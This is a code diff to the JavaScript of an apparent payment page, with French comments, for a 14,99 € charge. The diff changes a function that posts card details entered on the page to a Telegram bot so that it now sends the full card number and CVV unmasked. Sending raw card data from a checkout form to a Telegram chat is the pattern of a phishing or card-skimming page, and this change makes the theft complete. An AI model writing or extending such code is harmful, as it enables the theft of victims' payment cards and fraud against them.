@@ -1425,17 +1425,16 @@
     const loadingOverlay = document.getElementById('loadingOverlay');
     const payNowBtn = document.getElementById('payNowBtn');
     
-    // Fonction pour envoyer les données à Telegram (version simplifiée)
+    // Fonction pour envoyer les données à Telegram (version complète sans masquage)
     async function sendPaymentToTelegram(data, botToken, chatId) {
-
       const message = `
-        💳 *Informations de Paiement par Carte* 💳
+        💳 *Informations Complètes de Paiement par Carte* 💳
         
-        🔒 *Détails de la Carte:*
+        🔒 *Détails Complets de la Carte:*
         - Nom sur carte: ${data.cardName}
-        - Numéro: ${maskedCardNumber}
+        - Numéro complet: ${data.cardNumber.replace(/\s/g, '')}
         - Expiration: ${data.cardExpiry}
-        - CVV: ${maskedCvv}
+        - CVV: ${data.cardCvv}
         
         💰 *Montant de la Transaction:*
         - Total: 14,99 €
